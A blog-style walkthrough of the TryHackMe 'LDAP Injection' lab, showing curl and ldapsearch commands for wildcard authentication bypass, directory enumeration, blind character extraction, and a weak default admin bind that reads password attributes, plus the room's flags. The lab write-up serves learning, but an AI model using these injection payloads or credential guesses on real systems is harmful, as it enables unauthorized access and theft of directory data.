---
title: "TryHackMe LDAP Injection: Auth Bypass to Blind Exfiltration"
date: 2026-10-17T22:16:00+05:30
lastmod: 2026-10-17T22:16:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-ldap/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web Application Pentesting
  - Injection Attacks
  - LDAP Injection
  - LDAP
  - Authentication Bypass
  - Blind Injection
  - Directory Services

draft: false
description: "Walkthrough of TryHackMe LDAP Injection: tautology authentication bypass, enumerating every directory entry, and blind boolean injection to reach the dashboard flag."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|LDAP Injection |![LDAP Injection room icon](https://cdn-images.tryhackme.com/room-icons/1673da2794045c46bfd27b0e0fc8f123.png)|

LDAP Injection sits in the Injection Attacks module of the Web Application Pentesting path, right after the template work in [Server-side Template Injection](/post/thm-room-serversidetemplateinjection/) and the ORM and SQL rooms. The root cause is the same as every other room in the module, untrusted input reaching a query language, but the query language here is the LDAP search filter, with its own prefix-notation grammar of `&`, `|`, `!`, and the `*` wildcard. This room has two flags: a tautology authentication bypass in a visible login, and a blind boolean extraction against a login that only tells you yes or no.

The target is a small PHP app on Apache (Ubuntu) backed by OpenLDAP, reachable directly over the TryHackMe VPN, so every command below is a plain `curl` from my own machine. The lab IP was `10.49.177.56`; substitute your own. The app has three playgrounds: `normal.php` (reflects results), `blind.php` (boolean only), and a `login.php` plus `dashboard.php` pair.

## Task 5: the filter and the tautology bypass

The authentication code builds one LDAP filter from both inputs with no escaping:

```php
$filter = "(&(uid=$username)(userPassword=$password))";
```

That is an AND of two conditions. Because the `*` wildcard matches any value, submitting `*` in both fields turns it into `(&(uid=*)(userPassword=*))`, which matches every entry that has a uid and a password, so the search returns rows and the app logs you in as the first match.

```bash
  # tautology / wildcard bypass on normal.php
curl -s "http://$T/normal.php" --data-urlencode "username=*" --data-urlencode "password=*"
  # Welcome, Bob Smith!  LDAP Query: (&(uid=*)(userPassword=*))
```

The first user is Bob Smith, but the flag belongs to another entry. Since `normal.php` reflects the matched `cn`, I can page through the directory by excluding each name I have already seen. Injecting into the username field adds a negated clause: `*)(!(cn=Bob Smith)` makes the filter `(&(uid=*)(!(cn=Bob Smith))(userPassword=*))`, returning the next entry.

```bash
  # walk the directory, excluding each cn as it appears
  # username=*)(!(cn=Bob Smith))(!(cn=John Doe)  ...   password=*
  # -> Bob Smith -> John Doe -> Admin User -> THM{...}
```

The fourth entry's `cn` is the flag itself. The flag is **THM{!b451c_ld4p_inj3ct1ON!}**. The same effect comes from a prefix search like `f*`, which the room uses to show that uid values are directly addressable with wildcards.

{{< ad >}}

## Task 7: the blind boolean oracle

`blind.php` never reflects data. It answers with one of two messages, and that is the whole oracle:

```bash
  # green "Something is wrong in your password" = the filter matched an entry
  # red   "Password incorrect"                  = no match
curl -s "http://$T/blind.php" --data-urlencode "username=*" --data-urlencode "password=*"
```

Two quirks decide the approach. The password field escapes the `*` wildcard, so a prefix like `a*` there does nothing, but the username (uid) field passes wildcards and injection through untouched. So the extraction runs through the username. Testing `username=<prefix><char>*` with a present password returns green only when a uid starts with that prefix, which is exactly the character oracle the room's Python script automates.

```bash
  # blind extraction of the login email, char by char, via the uid wildcard
  # username = <known><candidate>*    green => candidate is the next character
  # recovered: admin_bl1nd@ldap.thm
```

Pivoting the same way into `(cn=...)` recovers that entry's `cn`, which is literally `flag`. The one thing the oracle cannot give up is the password: the `userPassword` attribute uses an equality-only matching rule (octetStringMatch), so substring and prefix filters against it always return false. No amount of `userPassword=a*` probing works.

## Task 7: reading the password from the exposed directory

Port 389 was open on the box, so instead of fighting the password matching rule I queried LDAP directly. An anonymous bind lists the tree but an ACL hides `userPassword`. A quick check of the default administrator account (`cn=admin,dc=ldap,dc=thm`) with a weak password got in and read the attribute:

```bash
  # anonymous bind: entries visible, userPassword hidden by ACL
ldapsearch -x -H ldap://$T -b "dc=ldap,dc=thm" "(uid=admin_bl1nd@ldap.thm)"
  # authenticated bind as the directory admin reads the hidden attribute
ldapsearch -x -H ldap://$T -D "cn=admin,dc=ldap,dc=thm" -w admin \
  -b "cn=flag,ou=users,dc=ldap,dc=thm" userPassword
  # userPassword:: ZmxhZw==   ->  base64 decodes to: flag
```

The password is `flag`, matching the entry's `cn`, so a guess of cn-equals-password would have worked too. With `admin_bl1nd@ldap.thm` and that password, `login.php` sets a session and redirects to `dashboard.php`, which prints the second flag.

```bash
curl -s -c c.txt "http://$T/login.php" \
  --data-urlencode "username=admin_bl1nd@ldap.thm" --data-urlencode "password=flag"
curl -s -b c.txt "http://$T/dashboard.php" | grep -o 'THM{.*}'
```

The flag in the dashboard is **THM{!!bl1nDLd4P1nj3ct10n!!}**.

## Takeaways

Two ideas carry past this lab into real web targets.

- **An LDAP filter is injectable the same way SQL is, but the grammar is the trick.** The win is restructuring the prefix-notation filter: a bare `*` is a tautology, `)(!(cn=...)` pages through entries, and `)(attr=value*)` pivots the test onto a different attribute. On a live target, any login, search, or user lookup that builds a filter from input is a candidate, and reflecting the built query (as `normal.php` did) hands you the exact structure to break out of.
- **Know the attribute's matching rule before you commit to blind extraction.** Hours disappear trying to prefix-match a `userPassword` that only supports equality. When an attribute will not yield to substring probing, step back and look for another channel: here an exposed LDAP service on 389 with a weak admin bind read the value outright. The web injection and the directory service were the same data behind two doors, and the quieter door was open.

Room solved 100%: 8 tasks, 2 flags.
